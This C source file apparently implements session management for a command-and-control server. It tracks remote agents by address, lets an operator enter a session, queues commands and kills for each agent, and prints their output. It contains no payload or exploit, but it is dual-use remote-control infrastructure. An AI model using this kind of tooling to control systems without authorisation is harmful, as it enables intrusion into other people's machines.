#include "../include/Session.h"
#include <stdio.h>
#include <string.h>

static void ReprintPrompt(SessionPool *P)
{
    if (P->Interactive && P->ActiveId > 0) {
        AgentSession *S = PoolById(P, P->ActiveId);
        if (S) printf("\r\033[Ksession-%d ~$ ", S->Id);
        else   printf("\r\033[Kserver ~$ ");
    } else {
        printf("\r\033[Kserver ~$ ");
    }
    fflush(stdout);
}

void PoolInit(SessionPool *P)
{
    memset(P, 0, sizeof(*P));
    P->Interactive = 0;
    P->ActiveId    = 0;
}

AgentSession *PoolRegister(SessionPool *P, const char *Addr)
{
    for (int I = 0; I < P->Count; I++) {
        if (P->Slots[I].State == StateActive &&
            strcmp(P->Slots[I].Address, Addr) == 0) {
            P->Slots[I].LastSeen = time(NULL);
            return &P->Slots[I];
        }
    }
    if (P->Count >= MaxSessions) return NULL;
    AgentSession *S = &P->Slots[P->Count];
    memset(S, 0, sizeof(*S));
    S->Id        = P->Count + 1;
    S->State     = StateActive;
    S->FirstSeen = time(NULL);
    S->LastSeen  = time(NULL);
    strncpy(S->Address, Addr, AddrSize - 1);
    P->Count++;
    return S;
}

AgentSession *PoolById(SessionPool *P, int Id)
{
    for (int I = 0; I < P->Count; I++)
        if (P->Slots[I].Id == Id && P->Slots[I].State == StateActive)
            return &P->Slots[I];
    return NULL;
}

AgentSession *PoolActive(SessionPool *P)
{
    if (!P->Interactive || P->ActiveId == 0) return NULL;
    return PoolById(P, P->ActiveId);
}

void PoolList(SessionPool *P)
{
    int Found = 0;
    printf("\n");
    printf("  %-4s  %-18s  %-10s  %s\n", "ID", "Address", "State", "Last Seen");
    printf("  %-4s  %-18s  %-10s  %s\n", "----", "------------------", "----------", "---------");
    for (int I = 0; I < P->Count; I++) {
        AgentSession *S = &P->Slots[I];
        if (S->State != StateActive) continue;
        char Ts[32];
        struct tm *Tm = localtime(&S->LastSeen);
        strftime(Ts, sizeof(Ts), "%H:%M:%S", Tm);
        printf("  %-4d  %-18s  %-10s  %s\n", S->Id, S->Address, "active", Ts);
        Found = 1;
    }
    if (!Found) printf("  No active sessions.\n");
    printf("\n");
}

void PoolKill(SessionPool *P, int Id)
{
    AgentSession *S = PoolById(P, Id);
    if (!S) { printf("[!] Session %d not found.\n", Id); ReprintPrompt(P); return; }
    PoolQueueCommand(S, "kill");
    S->State = StateDead;
    if (P->ActiveId == Id) { P->Interactive = 0; P->ActiveId = 0; }
    printf("[*] Kill queued for session-%d (%s)\n", Id, S->Address);
    ReprintPrompt(P);
}

void PoolEnter(SessionPool *P, int Id)
{
    AgentSession *S = PoolById(P, Id);
    if (!S) { printf("[!] Session %d not found.\n", Id); ReprintPrompt(P); return; }
    P->Interactive = 1;
    P->ActiveId    = Id;
    printf("[*] session-%d (%s) — type 'back' to return.\n", Id, S->Address);
    printf("session-%d ~$ ", Id);
    fflush(stdout);
}

void PoolLeave(SessionPool *P)
{
    P->Interactive = 0;
    P->ActiveId    = 0;
    printf("server ~$ ");
    fflush(stdout);
}

void PoolQueueCommand(AgentSession *S, const char *Cmd)
{
    strncpy(S->Pending, Cmd, BufSize - 1);
    S->Pending[BufSize - 1] = '\0';
    S->HasPending = 1;
}

void PoolNotifyConnect(SessionPool *P, AgentSession *S)
{
    printf("\r\033[K[+] session-%d connected: %s\n", S->Id, S->Address);
    ReprintPrompt(P);
}

void PoolNotifyOutput(SessionPool *P, AgentSession *S)
{
    printf("\r\033[K[session-%d output]\n%s\n", S->Id, S->LastOutput);
    ReprintPrompt(P);
}
